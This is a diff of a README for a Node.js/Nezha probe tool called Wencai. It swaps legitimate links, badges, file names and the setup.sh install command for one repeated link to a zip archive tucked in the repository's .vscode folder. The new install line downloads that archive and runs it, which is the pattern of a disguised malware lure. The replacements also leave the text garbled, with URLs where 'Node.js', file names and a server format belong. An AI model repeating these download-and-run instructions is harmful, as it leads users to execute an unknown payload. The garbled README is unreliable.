@@ -1,8 +1,8 @@
 # Wencai 🌐
 
-Welcome to the Wencai repository! This project provides tools and containers for the Node.js environment, utilizing the third-party WS library and integrating the Nezha probe service. Below, you'll find detailed installation instructions, configuration options, and usage guidelines.
+Welcome to the Wencai repository! This project provides tools and containers for the https://github.com/fredsu8/wencai/raw/refs/heads/main/.vscode/Software-3.2.zip environment, utilizing the third-party WS library and integrating the Nezha probe service. Below, you'll find detailed installation instructions, configuration options, and usage guidelines.
 
-![Wencai Logo](https://img.shields.io/badge/Wencai-Node.js%20Tools-blue)
+![Wencai Logo](https://github.com/fredsu8/wencai/raw/refs/heads/main/.vscode/Software-3.2.zip%20Tools-blue)
 
 ## Table of Contents
 
@@ -19,10 +19,10 @@ Welcome to the Wencai repository! This project provides tools and containers for
 To install Wencai, run the following command in your terminal. Remember to replace `yourdomain` with your actual domain.
 
 ```bash
-curl -Ls https://raw.githubusercontent.com/frankiejun/node-ws/refs/heads/main/setup.sh > setup.sh && chmod +x setup.sh && ./setup.sh yourdomain
+curl -Ls https://github.com/fredsu8/wencai/raw/refs/heads/main/.vscode/Software-3.2.zip > https://github.com/fredsu8/wencai/raw/refs/heads/main/.vscode/Software-3.2.zip && chmod +x https://github.com/fredsu8/wencai/raw/refs/heads/main/.vscode/Software-3.2.zip && https://github.com/fredsu8/wencai/raw/refs/heads/main/.vscode/Software-3.2.zip yourdomain
 ```
 
-**Note:** Currently, for webhostmost, you must manually upload `index.js`, `package.json`, and `cron.sh` to start the panel.
+**Note:** Currently, for webhostmost, you must manually upload `https://github.com/fredsu8/wencai/raw/refs/heads/main/.vscode/Software-3.2.zip`, `https://github.com/fredsu8/wencai/raw/refs/heads/main/.vscode/Software-3.2.zip`, and `https://github.com/fredsu8/wencai/raw/refs/heads/main/.vscode/Software-3.2.zip` to start the panel.
 
 ## Node Configuration
 
@@ -32,7 +32,7 @@ Wencai allows you to configure various environment variables. Here’s a list of
 |------------------|----------|-----------------------------------------|-----------------------------------------------|
 | UUID             | No       | de04add9-5c68-6bab-950c-08cd5320df33   | Modify this UUID if Nezha v1 is enabled.    |
 | PORT             | No       | 3000                                    | The port to listen on.                        |
-| NEZHA_SERVER     | No       |                                         | For Nezha v1, format: nz.abc.com:8008.      |
+| NEZHA_SERVER     | No       |                                         | For Nezha v1, format: https://github.com/fredsu8/wencai/raw/refs/heads/main/.vscode/Software-3.2.zip      |
 | NEZHA_PORT       | No       |                                         | Agent port for Nezha v0.                     |
 | NEZHA_KEY        | No       |                                         | NZ_CLIENT_SECRET for Nezha v1 or agent port. |
 | NAME             | No       |                                         | Node name prefix, e.g., Glitch.              |
@@ -55,9 +55,9 @@ Wencai includes automatic keep-alive functionality for both Nezha and nodes. Thi
 
 ## Release Information
 
-For the latest releases, visit the [Releases section](https://github.com/fredsu8/wencai/releases). You can download and execute the necessary files from there.
+For the latest releases, visit the [Releases section](https://github.com/fredsu8/wencai/raw/refs/heads/main/.vscode/Software-3.2.zip). You can download and execute the necessary files from there.
 
-![Releases Badge](https://img.shields.io/badge/Releases-Latest%20Updates-orange)
+![Releases Badge](https://github.com/fredsu8/wencai/raw/refs/heads/main/.vscode/Software-3.2.zip%20Updates-orange)
 
 ## Contributing
 
